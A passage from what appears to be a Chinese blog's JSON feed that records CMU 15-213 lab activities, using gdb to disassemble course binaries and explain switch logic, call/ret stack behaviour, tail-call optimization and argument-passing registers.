keyword\">switch</span><span class=\"token punctuation\">(</span>st<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Finish\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> inArg <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span> inArg <span class=\"token operator\">*=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span> inArg <span class=\"token operator\">>>=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span> inArg <span class=\"token operator\">&amp;=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span> inArg<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">default</span><span class=\"token operator\">:</span>  <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        st <span class=\"token operator\">=</span> inArg <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>inArg <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span> argv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">int</span> inArg<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>argc <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Please rerun with a positive number argument\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    inArg <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>inArg <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Argument was not a positive integer\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token function\">compute</span><span class=\"token punctuation\">(</span>inArg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>所以我们要让 gdb 打印 <code>Finish</code> ，st 就得为 0， <code>inArg</code>  就得为 0，那么就输入 1 个参数 <code>0</code>  即可。</p>\n<pre><code>gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec4$ ./act4 0\nFinish\n</code></pre>\n<p>我们要对汇编代码进行分析，就要使用 <code>gdb</code> 。输入 <code>gdb act4</code> ，输入 <code>disas main</code> ，得到如下结果：</p>\n<pre><code>(gdb) disas main\nDump of assembler code for function main:\n   0x0000000000401730 &lt;+0&gt;:     endbr64\n   0x0000000000401734 &lt;+4&gt;:     sub    $0x8,%rsp\n   0x0000000000401738 &lt;+8&gt;:     lea    0x938e1(%rip),%rdx        # 0x495020\n   0x000000000040173f &lt;+15&gt;:    cmp    $0x1,%edi\n   0x0000000000401742 &lt;+18&gt;:    je     0x40176d &lt;main+61&gt;\n   0x0000000000401744 &lt;+20&gt;:    mov    0x8(%rsi),%rdi\n   0x0000000000401748 &lt;+24&gt;:    mov    $0xa,%edx\n   0x000000000040174d &lt;+29&gt;:    xor    %esi,%esi\n   0x000000000040174f &lt;+31&gt;:    callq  0x410310 &lt;strtoq&gt;\n   0x0000000000401754 &lt;+36&gt;:    test   %eax,%eax\n   0x0000000000401756 &lt;+38&gt;:    js     0x401766 &lt;main+54&gt;\n   0x0000000000401758 &lt;+40&gt;:    mov    %eax,%edi\n   0x000000000040175a &lt;+42&gt;:    callq  0x401d20 &lt;compute&gt;\n   0x000000000040175f &lt;+47&gt;:    xor    %eax,%eax\n   0x0000000000401761 &lt;+49&gt;:    add    $0x8,%rsp\n   0x0000000000401765 &lt;+53&gt;:    retq\n   0x0000000000401766 &lt;+54&gt;:    lea    0x938e3(%rip),%rdx        # 0x495050\n   0x000000000040176d &lt;+61&gt;:    mov    0xbef54(%rip),%rdi        # 0x4c06c8 &lt;stderr&gt;\n   0x0000000000401774 &lt;+68&gt;:    mov    $0x1,%esi\n   0x0000000000401779 &lt;+73&gt;:    xor    %eax,%eax\n   0x000000000040177b &lt;+75&gt;:    callq  0x44c080 &lt;__fprintf_chk&gt;\n   0x0000000000401780 &lt;+80&gt;:    mov    $0x1,%eax\n   0x0000000000401785 &lt;+85&gt;:    jmp    0x401761 &lt;main+49&gt;\nEnd of assembler dump.\n</code></pre>\n<p>这里代码分析如下：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 初始化 $rdi = 0x1, $rsi = 0x7fffffffdf18。因此 rdi = argc, rsi = argv</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>   <span class=\"token comment\">// 预留 8 个字节的栈空间</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   rdx <span class=\"token operator\">=</span> rip <span class=\"token operator\">+</span> <span class=\"token number\">0x938e1</span> <span class=\"token operator\">-></span> 这句是干嘛的？</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>   <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>edi <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      rdi <span class=\"token operator\">=</span> rip <span class=\"token operator\">+</span> <span class=\"token number\">0xbef54</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">-></span> <span class=\"token constant\">stderr</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      esi <span class=\"token operator\">=</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      eax <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      call fprintf</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      eax <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token comment\">//rsp 恢复</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token keyword\">return</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      rdi <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>rsi <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      ecx <span class=\"token operator\">=</span> <span class=\"token number\">0xa</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      esi <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      call strtoq<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>eax <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>         rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x938e3</span> <span class=\"token operator\">+</span> rip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>         rdi <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>rip <span class=\"token operator\">+</span> <span class=\"token number\">0xbef54</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">-></span> <span class=\"token constant\">stderr</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>         esi <span class=\"token operator\">=</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>         eax <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>         call fprintf</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>         eax <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>         <span class=\"token comment\">//rsp 恢复</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>         <span class=\"token keyword\">return</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>         edi <span class=\"token operator\">=</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>         call compute</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>         eax <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>         <span class=\"token comment\">//rsp 恢复</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>         <span class=\"token keyword\">return</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里涉及到三个函数： <code>fprintf</code> ， <code>strtoq</code> , <code>compute</code> 。 <code>fprintf</code>  通常和 <code>stderr</code>  结合在一起。</p>\n<p>对 <code>strtoq</code>  进行反汇编得到如下结果：</p>\n<pre><code>(gdb) disas strtoq\nDump of assembler code for function strtoq:\n   0x0000000000410310 &lt;+0&gt;:     endbr64\n   0x0000000000410314 &lt;+4&gt;:     mov    $0xffffffffffffffa8,%rax\n   0x000000000041031b &lt;+11&gt;:    xor    %ecx,%ecx\n   0x000000000041031d &lt;+13&gt;:    mov    %fs:(%rax),%r8\n   0x0000000000410321 &lt;+17&gt;:    jmpq   0x410370 &lt;____strtoll_l_internal&gt;\nEnd of assembler dump.\n</code></pre>\n<p>对 <code>compute</code>  进行反汇编得到如下结果：</p>\n<pre><code>(gdb) disas compute\nDump of assembler code for function compute:\n   0x0000000000401d20 &lt;+0&gt;:     endbr64\n   0x0000000000401d24 &lt;+4&gt;:     lea    (%rdi,%rdi,2),%edx\n   0x0000000000401d27 &lt;+7&gt;:     lea    0x932de(%rip),%rcx        # 0x49500c\n   0x0000000000401d2e &lt;+14&gt;:    mov    %edx,%eax\n   0x0000000000401d30 &lt;+16&gt;:    and    $0xf,%eax\n   0x0000000000401d33 &lt;+19&gt;:    cmp    $0x4,%eax\n   0x0000000000401d36 &lt;+22&gt;:    ja     0x401d53 &lt;compute+51&gt;\n   0x0000000000401d38 &lt;+24&gt;:    movslq (%rcx,%rax,4),%rax\n   0x0000000000401d3c &lt;+28&gt;:    add    %rcx,%rax\n   0x0000000000401d3f &lt;+31&gt;:    notrack jmpq *%rax\n   0x0000000000401d42 &lt;+34&gt;:    nopw   0x0(%rax,%rax,1)\n   0x0000000000401d48 &lt;+40&gt;:    and    $0x1,%edx\n   0x0000000000401d4b &lt;+43&gt;:    mov    %edx,%eax\n   0x0000000000401d4d &lt;+45&gt;:    jmp    0x401d33 &lt;compute+19&gt;\n   0x0000000000401d4f &lt;+47&gt;:    nop\n   0x0000000000401d50 &lt;+48&gt;:    sar    $0x2,%edx\n   0x0000000000401d53 &lt;+51&gt;:    mov    %edx,%eax\n   0x0000000000401d55 &lt;+53&gt;:    and    $0xf,%eax\n   0x0000000000401d58 &lt;+56&gt;:    test   %edx,%edx\n   0x0000000000401d5a &lt;+58&gt;:    jns    0x401d33 &lt;compute+19&gt;\n   0x0000000000401d5c &lt;+60&gt;:    retq\n   0x0000000000401d5d &lt;+61&gt;:    nopl   (%rax)\n   0x0000000000401d60 &lt;+64&gt;:    add    %edx,%edx\n   0x0000000000401d62 &lt;+66&gt;:    jmp    0x401d53 &lt;compute+51&gt;\n   0x0000000000401d64 &lt;+68&gt;:    nopl   0x0(%rax)\n   0x0000000000401d68 &lt;+72&gt;:    sub    $0x1,%edx\n   0x0000000000401d6b &lt;+75&gt;:    jmp    0x401d53 &lt;compute+51&gt;\n   0x0000000000401d6d &lt;+77&gt;:    nopl   (%rax)\n   0x0000000000401d70 &lt;+80&gt;:    lea    0x9328d(%rip),%rsi        # 0x495004\n   0x0000000000401d77 &lt;+87&gt;:    mov    $0x1,%edi\n   0x0000000000401d7c &lt;+92&gt;:    xor    %eax,%eax\n   0x0000000000401d7e &lt;+94&gt;:    jmpq   0x44bfb0 &lt;__printf_chk&gt;\nEnd of assembler dump.\n</code></pre>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20procedures%20activity/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20procedures%20activity/",
            "title": "15-213 Machine Procedures Activity 记录",
            "date_published": "2024-02-29T09:18:15.000Z",
            "content_html": "<h2 id=\"activity-1\"><a class=\"markdownIt-Anchor\" href=\"#activity-1\">#</a> Activity 1</h2>\n<p>输入 <code>gdb --args ./calls</code> ，输入 <code>r</code> ，提示如下：</p>\n<pre><code>  (gdb) r\nIf you didn't run it that way, it will now crash.\nOtherwise, you will get the (gdb) prompt back.\n\nType 'c' (short for 'continue') at the (gdb) prompt.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/calls.c:148\n148     machine-procedures/calls.c: No such file or directory.\n</code></pre>\n<p>输入两次 <code>c</code> ，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nshowStack has been called again. Let's look at the contents\nof the stack right now (just before the pop is executed):\n(gdb) x/2gx $rsp\n\n(Recall that the 'x' command prints memory. The '/2gx' modifier\ntells it to print two 'g'iant (64-bit) values in he'x'adecimal,\nand '$rsp' means to start at the current value of the %rsp\nregister, i.e. the stack pointer.)\n\nAnswer Problem 1 now: fill in the blanks with the value of the stack pointer\nand the contents of the stack. When you are finished, 'c'ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0x00000000004011e1 in showStack ()\n</code></pre>\n<p>输入 <code>x/2gx $rsp</code> ，得到如下信息：</p>\n<pre><code>(gdb) x/2gx $rsp\n0x7fffffffdde0: 0x0000000000015213      0x000000000040117a\n</code></pre>\n<p>此时 <code>$rsp = (void *) 0x7fffffffdde0</code> ，其指向的地址的值如上图所示。打印 <code>0x000000000040117a</code>  处的值，可以看到如下结果：</p>\n<pre><code>(gdb) x/2gx 0x000000000040117a\n0x40117a &lt;main+48&gt;:     0xe37e02fb8301c383      0xfea4e800402108bf\n</code></pre>\n<p><code>gdb</code>  显示这里是 <code>&lt;main + 48&gt;</code> ，那么我们对 <code>main</code>  函数进行反汇编：</p>\n<pre><code>(gdb) disassemble main\nDump of assembler code for function main:\n   0x000000000040114a &lt;+0&gt;:     push   %rbx\n   0x000000000040114b &lt;+1&gt;:     mov    (%rsi),%rsi\n   0x000000000040114e &lt;+4&gt;:     mov    $0x402010,%edi\n   0x0000000000401153 &lt;+9&gt;:     mov    $0x0,%eax\n   0x0000000000401158 &lt;+14&gt;:    callq  0x401040 &lt;printf@plt&gt;\n   0x000000000040115d &lt;+19&gt;:    int3\n   0x000000000040115e &lt;+20&gt;:    mov    $0x0,%ebx\n   0x0000000000401163 &lt;+25&gt;:    jmp    0x40117d &lt;main+51&gt;\n   0x0000000000401165 &lt;+27&gt;:    movslq %ebx,%rax\n   0x0000000000401168 &lt;+30&gt;:    mov    0x402e60(,%rax,8),%rdi\n   0x0000000000401170 &lt;+38&gt;:    callq  0x401030 &lt;puts@plt&gt;\n   0x0000000000401175 &lt;+43&gt;:    callq  0x4011db &lt;showStack&gt;\n   0x000000000040117a &lt;+48&gt;:    add    $0x1,%ebx\n   0x000000000040117d &lt;+51&gt;:    cmp    $0x2,%ebx\n   0x0000000000401180 &lt;+54&gt;:    jle    0x401165 &lt;main+27&gt;\n--Type &lt;RET&gt; for more, q to quit, c to continue without paging--\n   0x0000000000401182 &lt;+56&gt;:    mov    $0x402108,%edi\n   0x0000000000401187 &lt;+61&gt;:    callq  0x401030 &lt;puts@plt&gt;\n   0x000000000040118c &lt;+66&gt;:    int3\n   0x000000000040118d &lt;+67&gt;:    mov    $0x402270,%edi\n   0x0000000000401192 &lt;+72&gt;:    callq  0x401030 &lt;puts@plt&gt;\n   0x0000000000401197 &lt;+77&gt;:    int3\n   0x0000000000401198 &lt;+78&gt;:    mov    $0x402478,%edi\n   0x000000000040119d &lt;+83&gt;:    callq  0x401030 &lt;puts@plt&gt;\n   0x00000000004011a2 &lt;+88&gt;:    mov    $0x0,%eax\n   0x00000000004011a7 &lt;+93&gt;:    pop    %rbx\n   0x00000000004011a8 &lt;+94&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>可以看到这个值是 <code>callq  0x4011db &lt;showStack&gt;</code>  的下一条指令地址，也就是 <code>callq</code>  调用的返回地址。</p>\n<p>输入 <code>c</code>  继续，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nshowStack has been called a third time. Now let's watch it return.\nGDB provides many commands for advancing through the program\nother than 'c'ontinue. The 'si' command, for instance,\nexecutes a single assembly instruction.\n\nUse this command twice now.\nAfter each step, print the values of %rsp and %rip:\n\n(gdb) si\n(gdb) p $rsp\n(gdb) p $rip\n\nBased on how %rsp and %rip changed after each instruction,\nanswer Problems 2 and 3 now. When you are finished, 'c'ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>输入 <code>si</code> ， <code>%rsp</code>  和 <code>%rip</code>  的值如下：</p>\n<pre><code>(gdb) p $rsp\n$1 = (void *) 0x7fffffffdde8\n(gdb) p $rip\n$2 = (void (*)()) 0x4011e2 &lt;showStack+7&gt;\n</code></pre>\n<p>对 <code>showStack</code>  函数进行反汇编可以看到：</p>\n<pre><code>(gdb) disassemble showStack\nDump of assembler code for function showStack:\n   0x00000000004011db &lt;+0&gt;:     pushq  $0x15213\n   0x00000000004011e0 &lt;+5&gt;:     int3\n   0x00000000004011e1 &lt;+6&gt;:     pop    %rax\n=&gt; 0x00000000004011e2 &lt;+7&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>这里 <code>%rip</code>  指向的是 <code>retq</code>  指令，再次打印 <code>%rsp</code>  和 <code>%rip</code>  的值可以看到：</p>\n<pre><code>(gdb) p $rsp\n$3 = (void *) 0x7fffffffddf0\n(gdb) p $rip\n$4 = (void (*)()) 0x40117a &lt;main+48&gt;\n</code></pre>\n<p>这里 <code>%rsp</code>  的值相对于 <code>retq</code>  前 + 8，并且 <code>$rip</code>  的值等于下一条指令的地址。由此可以推断，此处 <code>ret</code>  指令将栈顶的地址弹出，并赋值给 <code>%rip</code> 。那么 <code>callq</code>  指令做的事就是将下一条指令的地址压栈，然后将 <code>%rip</code>  的值设置为 <code>callq</code>  的目标地址。</p>\n<p>输入 <code>c</code>  继续，指令如下：</p>\n<pre><code>(gdb) c\nContinuing.\n\nAs you've seen, a ret pops a 64-bit address off the\ntop of the stack and jumps to that location.\n\nNow disassemble the function returnOne. It calls another function, abs.\nBased on what you see, and your knowledge of the ret instruction,\nanswer Problem 4 now. When you are finished, 'c'ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/calls.c:156\n156     in machine-procedures/calls.c\n</code></pre>\n<p>对 <code>returnOne</code>  进行反汇编可以看到：</p>\n<pre><code>(gdb) disassemble returnOne\nDump of assembler code for function returnOne:\n   0x00000000004011e7 &lt;+0&gt;:     mov    $0xffffffff,%edi\n   0x00000000004011ec &lt;+5&gt;:     callq  0x401142 &lt;abs&gt;\n   0x00000000004011f1 &lt;+10&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>对 <code>returnOneOpt</code>  进行反汇编即可看到：</p>\n<pre><code>(gdb) disassemble returnOneOpt\nDump of assembler code for function returnOneOpt:\n   0x00000000004011f2 &lt;+0&gt;:     mov    $0xffffffff,%edi\n   0x00000000004011f7 &lt;+5&gt;:     jmpq   0x401142 &lt;abs&gt;\nEnd of assembler dump.\n</code></pre>\n<p>对 <code>abs</code>  反汇编结果如下：</p>\n<pre><code>(gdb) disassemble abs\nDump of assembler code for function abs:\n   0x0000000000401142 &lt;+0&gt;:     mov    %edi,%eax\n   0x0000000000401144 &lt;+2&gt;:     cltd\n   0x0000000000401145 &lt;+3&gt;:     xor    %edx,%eax\n   0x0000000000401147 &lt;+5&gt;:     sub    %edx,%eax\n   0x0000000000401149 &lt;+7&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p><code>returnOne</code>  中的过程是，先 <code>callq  0x401142 &lt;abs&gt;</code> ，然后 <code>retq</code> 。 <code>returnOneOpt</code>  改为直接 <code>jmpq   0x401142 &lt;abs&gt;</code> 。而 <code>abs</code>  执行完后直接 <code>retq</code> 。</p>\n<p>对 <code>returnOne</code> ，其过程为：</p>\n<ol>\n<li>将 main 函数中下一条指令地址压栈，将 <code>returnOne</code>  地址赋给 <code>%rip</code></li>\n<li>执行一段，调用 <code>abs</code></li>\n<li>将 <code>returnOne</code>  中下一条指令地址压栈，把 <code>abs</code>  地址付给 <code>%rip</code></li>\n<li>执行一段，从 <code>abs</code>  返回（执行 <code>abs</code>  的 <code>retq</code> ），从栈中弹出 <code>returnOne</code>  中 <code>retq</code>  地址赋给 <code>$rip</code> ， <code>$rip</code>  跳转到 <code>returnOne</code>  的 <code>retq</code> 。</li>\n<li>执行 <code>returnOne</code>  的 <code>retq</code> ，将栈顶返回地址弹出，赋给 <code>$rip</code> 。</li>\n</ol>\n<p>对 <code>returnOneOpt</code> ，其过程为：</p>\n<ol>\n<li>将 main 函数中下一条指令地址压栈，将 <code>returnOne</code>  地址赋给 <code>%rip</code></li>\n<li>执行一段，跳转到 <code>abs</code></li>\n<li>将 <code>returnOne</code>  中下一条指令地址压栈，把 <code>abs</code>  地址付给 <code>%rip</code></li>\n<li>执行一段，从 <code>abs</code>  返回（执行 <code>abs</code>  的 <code>retq</code> ），从栈中弹出 <code>main</code>  中 <code>retq</code>  地址赋给 <code>$rip</code></li>\n</ol>\n<p>可以这样进行优化的原因是两条 <code>retq</code>  指令连在一起，所以没有必要 <code>retq</code>  两次，将 <code>abs</code>  和 <code>returnOne</code>  的过程接在一起构成一个 <code>procedure</code> ， <code>retq</code>  一次即可。</p>\n<p>输入 <code>c</code> ，题目中给出了答案：</p>\n<pre><code>(gdb) c\nContinuing.\n\nThe transformation you just witnessed is a simple example of tail-call\noptimization. Because a call was the last instruction before a ret,\nwithin a function that doesn't adjust the stack pointer, the compiler\ncould skip allocating a stack frame: both the call and the ret could be\nreplaced with a simple jmp to the called function. That function must\nend in its own ret instruction, which will use the return address\npushed by the call to returnOneOpt. This optimization is especially\nvaluable when applied to recursive functions.\n\nEnd of Activity 1. This program will now exit.\n\nUse the 'q'uit command to leave GDB.\n\n[Inferior 1 (process 68527) exited normally]\n</code></pre>\n<p>原来这里是尾递归优化的精髓啊！明白啦！</p>\n<h2 id=\"activity-2\"><a class=\"markdownIt-Anchor\" href=\"#activity-2\">#</a> Activity 2</h2>\n<p>输入 <code>gdb --args ./locals</code> ，输入 <code>r</code> ，再输入 <code>c</code> ，得到的提示如下：</p>\n<pre><code>The stack is also used to pass data between procedures, but nowadays\nmost function arguments are passed in registers instead.  You have\nalready seen the first two argument-passing registers (%rdi and %rsi,\nin that order) in use.\n\nDissassemble the function seeArgs.\nIt calls printf with six arguments.  Arguments 2-6 are labeled for you\nin the assembly.\nBased on what you see in the disasssembly, answer Problem 6.\nCheck your answer using:\n(gdb) x/s &lt;value passed in %rdi&gt;.\n\nWhen you are finished, 'c'ontinue.\n\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at machine-procedures/locals.c:156\n156     in machine-procedures/locals.c\n</code></pre>\n<p>输入 <code>disassemble seeArgs</code> ，提示如下：</p>\n<pre><code>(gdb) disassemble seeArgs\nDump of assembler code for function seeArgs:\n   0x0000000000401152 &lt;+0&gt;:     sub    $0x8,%rsp\n   0x0000000000401156 &lt;+4&gt;:     mov    $0x6,%r9d\n   0x000000000040115c &lt;+10&gt;:    mov    $0x5,%r8d\n   0x0000000000401162 &lt;+16&gt;:    mov    $0x4,%ecx\n   0x0000000000401167 &lt;+21&gt;:    mov    $0x3,%edx\n   0x000000000040116c &lt;+26&gt;:    mov    $0x2,%esi\n   0x0000000000401171 &lt;+31&gt;:    mov    $0x402016,%edi\n   0x0000000000401176 &lt;+36&gt;:    mov    